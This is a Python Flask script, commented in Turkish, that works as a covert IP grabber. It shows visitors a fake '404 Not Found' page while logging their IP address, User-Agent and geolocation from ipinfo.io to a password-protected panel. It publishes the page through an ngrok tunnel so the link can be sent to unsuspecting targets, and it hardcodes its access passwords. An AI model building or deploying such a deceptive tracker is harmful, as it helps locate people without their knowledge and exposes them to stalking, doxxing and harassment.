from flask import Flask, request, render_template_string, redirect, url_for, session
from getpass import getpass
from threading import Thread
from pyngrok import ngrok
import requests
import os

app = Flask(__name__)
app.secret_key = "gizli-session-key"
log_kaydi = []

PANEL_SIFRE = "gizlipanel"

# 🌍 Ziyaretçi konumunu alma
def ip_konum_al(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'ip': ip,
                'user_agent': request.headers.get('User-Agent'),
                'ülke': data.get("country", "Bilinmiyor"),
                'şehir': data.get("city", "Bilinmiyor"),
                'lokasyon': data.get("loc", "Bilinmiyor")
            }
    except:
        pass
    return {
        'ip': ip,
        'user_agent': request.headers.get('User-Agent'),
        'ülke': 'Bilinmiyor',
        'şehir': 'Bilinmiyor',
        'lokasyon': 'Bilinmiyor'
    }

# 🌐 Ziyaretçi için sahte 404 sayfası
@app.route('/')
def anasayfa():
    ip = request.remote_addr
    log = ip_konum_al(ip)
    log_kaydi.append(log)
    return render_template_string('''
        <h1>404 Not Found</h1>
        <p>The requested URL was not found on the server.</p>
    '''), 404

# 🔒 Panel şifre korumalı
@app.route('/panel', methods=["GET", "POST"])
def panel():
    if session.get("giris_yapildi"):
        return render_template_string('''
            <h1>📋 Cihaz Paneli</h1>
            <ul>
            {% for log in loglar %}
                <li>
                    <b>IP:</b> {{log.ip}} <br>
                    <b>User-Agent:</b> {{log.user_agent}} <br>
                    <b>Ülke:</b> {{log.ülke}}, <b>Şehir:</b> {{log.şehir}} <br>
                    <b>Lokasyon:</b> {{log.lokasyon}}
                </li><hr>
            {% endfor %}
            </ul>
        ''', loglar=log_kaydi)
    else:
        return redirect(url_for("giris"))

@app.route('/giris', methods=["GET", "POST"])
def giris():
    if request.method == "POST":
        sifre = request.form.get("sifre")
        if sifre == PANEL_SIFRE:
            session["giris_yapildi"] = True
            return redirect(url_for("panel"))
        else:
            return "<h3>❌ Hatalı şifre</h3>"
    return '''
        <form method="post">
            <h2>🔐 Panel Girişi</h2>
            Şifre: <input type="password" name="sifre">
            <input type="submit" value="Giriş">
        </form>
    '''

# 🚀 Flask başlatıcı
def flaski_baslat():
    app.run(port=5000)

# 🌐 Ngrok token ile tünel oluşturucu
def ngrok_baslat(token):
    if token:
        os.system(f"ngrok config add-authtoken {token}")
        public_url = ngrok.connect(5000)
        print(f"\n🌐 NGROK Adresi: {public_url}")
        print(f"👀 Panel: {public_url}/panel")
        print(f"🔒 Panel Giriş: {public_url}/giris")
        print(f"🕵️  Ziyaretçiler: {public_url}/")
        return True
    else:
        print("❌ Ngrok token girilmedi, program başlatılmadı.")
        return False

# 🔐 Key kontrolü
def key_girisi():
    DOGRU_KEY = "adminpro"
    MAX_DENEME = 5
    for hak in range(MAX_DENEME):
        key = getpass("🔐 Ana Key girin (gizli): ")
        if key == DOGRU_KEY:
            print("✅ Giriş başarılı.")
            return True
        else:
            print(f"❌ Hatalı key. Kalan deneme: {MAX_DENEME - hak - 1}")
    print("🚫 Çok fazla yanlış deneme.")
    return False

# 🔄 Ana işlem
if __name__ == '__main__':
    # Ngrok token önce sorulacak
    token = input("🔑 NGROK Token girin: ").strip()
    if ngrok_baslat(token):  # Sadece başarılıysa devam et
        if key_girisi():     # Key sorulacak
            Thread(target=flaski_baslat).start()
        else:
            print("🔒 Yetkisiz giriş. Sunucu başlatılmadı.")
            exit()
    else:
        exit()
